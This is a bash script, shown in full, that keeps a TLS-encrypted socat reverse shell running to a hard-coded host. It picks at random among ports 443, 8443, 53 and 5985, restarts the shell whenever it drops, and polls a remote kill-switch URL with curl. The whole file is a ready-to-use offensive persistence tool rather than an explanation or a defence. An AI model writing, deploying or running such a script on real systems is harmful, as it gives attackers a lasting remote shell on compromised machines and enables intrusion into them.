#!/bin/bash

# === CONFIG ===
TARGET_HOST="192.168.1.100"
TARGET_PORTS=("443" "8443" "53" "5985")
REMOTE_KILL_URL="http://example.com/kill.txt"
CHECK_INTERVAL=15
SOCAT_CMD="nohup socat -d -d EXEC:\"bash -li\",pty,stderr,setsid,sigint,sane OPENSSL:${TARGET_HOST}:${TARGET_PORT},verify=0 &"

# === FUNCTIONS ===

check_kill_switch() {
    curl --max-time 5 -s "$REMOTE_KILL_URL" | grep -q "KILL"
    return $?
}

check_target_alive() {
    ping -c 1 -W 1 $TARGET_HOST > /dev/null 2>&1
    return $?
}

# === MAIN LOOP ===

echo "[*] Starting persistent reverse shell with TLS and watchdog..."

while true; do
    if check_kill_switch; then
        echo "[!] Kill switch triggered. Exiting."
        pkill -f socat
        exit 0
    fi

    if check_target_alive; then
        if ! pgrep -f "socat.*OPENSSL" > /dev/null; then
            PORT=${TARGET_PORTS[$RANDOM % ${#TARGET_PORTS[@]}]}
            echo "[*] Target reachable. Starting reverse shell to $TARGET_HOST:$PORT"
            eval ${SOCAT_CMD//\${TARGET_PORT}/$PORT}
        fi
    else
        echo "[!] Target not reachable. Retrying in $CHECK_INTERVAL seconds..."
    fi
    sleep $CHECK_INTERVAL
done
